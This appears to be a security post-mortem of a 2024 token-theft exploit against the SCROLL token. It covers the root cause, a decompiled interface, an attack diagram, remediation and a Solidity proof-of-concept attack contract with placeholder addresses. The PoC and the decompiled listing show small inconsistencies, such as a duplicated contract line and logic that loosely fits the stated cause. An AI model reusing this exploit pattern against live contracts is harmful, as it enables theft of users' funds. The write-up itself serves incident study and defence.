# SCROLL — Universal Router execute() Token Theft Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | SCROLL |
| **Chain** | Ethereum |
| **Loss** | ~76 ETH |
| **Attack Contract** | [0x55f5aac4](https://etherscan.io/address/0x55f5aac4466eb9b7bbeee8c05b365e5b18b5afcc) |
| **Vulnerable Contract** | [SCROLL 0xe51D3dE9](https://etherscan.io/address/0xe51D3dE9b81916D383eF97855C271250852eC7B7) |
| **Root Cause** | SCROLL tokens were transferred to the router via encoded commands (command byte `0x05`) through Uniswap Universal Router's `execute()` function, then moved to a liquidity pair, allowing mass WETH extraction via swap |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/SCROLL_exp.sol) |

---

## 1. Vulnerability Overview

The SCROLL token has a code path where tokens are held in the router's temporary buffer when certain commands are executed through the Uniswap Universal Router. The attacker used command byte `0x05` (V2_SWAP_EXACT_IN) to move SCROLL tokens in stages, ultimately extracting a large amount of WETH from the SCROLL/WETH pair. The core vulnerability is the bypass of SCROLL token's own transfer restrictions.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: transfer restriction bypass via Universal Router execute command
// SCROLL token does not restrict transfers routed through the Universal Router

// Universal Router execute(): sequentially executes encoded commands
// command 0x05 = V2_SWAP_EXACT_IN
// → SCROLL → Universal Router → transferable to pair
// → WETH extracted via pair.swap()

// ✅ Safe code: managed transfer restriction addresses
contract ScrollToken {
    mapping(address => bool) public blacklisted;

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        // Block transfers via Universal Router
        require(!blacklisted[from] && !blacklisted[to], "blacklisted");
        // Or use whitelist-based transfer control
    }
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: SCROLL_decompiled.sol
contract SCROLL {
contract SCROLL {
    address public owner;


    // Selector: 0x86942310
    function isW(address p0) external view returns (bool) {}  // ❌ Vulnerability

    // Selector: 0xb2b587ba
    function unknown_b2b587ba() external {}

    // Selector: 0xe5339685
    function bl(address p0) external {}

    // Selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0xf7331e3c
    function recoverBNBfromContract(address p0) external {}

    // Selector: 0xf87dc2c6
    function tradeEnable() external {}

    // Selector: 0xb7a7a881
    function addB(address p0, uint256 p1) external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0x87741434
    function recoverBEP20FromContract(address p0, uint256 p1, address p2) external {}

    // Selector: 0x8a8c523c
    function enableTrading() external {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0x3f60b426
    function removeB(address p0) external {}

    // Selector: 0x4949b429
    function checkAllowanceBalance(uint256 p0) external view returns (uint256) {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x7f21b9b9
    function addW(address p0) external {}

    // Selector: 0x85141a77
    function deadWallet() external {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    // 📌 approve - safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0x0c19f047
    function removeW(address p0) external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x23b872dd
    // 📌 arbitrary transferFrom - approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Universal Router.execute(0x05, [..., SCROLL, recipient])
  │         └─ SCROLL token → Universal Router buffer
  │
  ├─→ [2] getAmountsOut(scrollAmt, [SCROLL, WETH])
  │         └─ Calculate expected WETH output amount
  │
  ├─→ [3] SCROLL → transferred to SCROLL/WETH pair
  │
  ├─→ [4] pair.swap(wethOut, 0, attacker, "")
  │         └─ Extract WETH
  │
  ├─→ [5] WETH.withdraw() → receive ETH
  │
  ├─→ [6] Remaining SCROLL in router → received by attacker
  │
  └─→ [7] ~76 ETH stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory);
}

contract AttackContract {
    IUniversalRouter constant universalRouter = IUniversalRouter(/* Uniswap Universal Router */);
    IUniswapV2Router constant v2Router        = IUniswapV2Router(/* Uniswap V2 Router */);
    address constant SCROLL = 0xe51D3dE9b81916D383eF97855C271250852eC7B7;
    address constant WETH   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant pair   = /* SCROLL/WETH pair */;

    function testExploit() external {
        uint256 scrollAmt = IERC20(SCROLL).balanceOf(/* holder */);

        // [1] Universal Router execute: SCROLL → router buffer
        bytes memory commands = abi.encodePacked(bytes1(0x05));  // V2_SWAP_EXACT_IN
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(this), scrollAmt, 0, abi.encode(SCROLL, WETH), false);
        universalRouter.execute(commands, inputs, block.timestamp);

        // [2] SCROLL balance → transfer to pair
        uint256 scrollBal = IERC20(SCROLL).balanceOf(address(this));
        IERC20(SCROLL).transfer(pair, scrollBal);

        // [3] Extract WETH via pair.swap
        address[] memory path = new address[](2);
        path[0] = SCROLL; path[1] = WETH;
        uint256[] memory amts = v2Router.getAmountsOut(scrollBal, path);
        IUniswapV2Pair(pair).swap(amts[1], 0, address(this), "");

        // [4] WETH → ETH
        IWETH(WETH).withdraw(IERC20(WETH).balanceOf(address(this)));
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Transfer restriction bypass (via Universal Router) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (Universal Router execute + swap) |
| **DApp Category** | Transfer-restricted token |
| **Impact** | Mass token extraction → WETH theft (~76 ETH) |

## 6. Remediation Recommendations

1. **Block Universal Router transfers**: Add the Universal Router address to the blacklist
2. **Transfer path validation**: Allow transfers only to/from a permitted contract whitelist
3. **Router buffer monitoring**: Detect abnormal large-volume transfers through the Universal Router
4. **Transfer restriction bypass audit**: Audit bypass paths through all major DEX routers

## 7. Lessons Learned

- Even tokens with transfer restrictions can be circumvented if bypass paths through intermediaries such as the Uniswap Universal Router are not blocked.
- The `execute()` command system of the Universal Router is complex, making it difficult to manually analyze all possible paths.
- Before deployment, transfer-restricted tokens must be tested against bypass paths through all major DeFi infrastructure (Router V2/V3, Universal Router, etc.).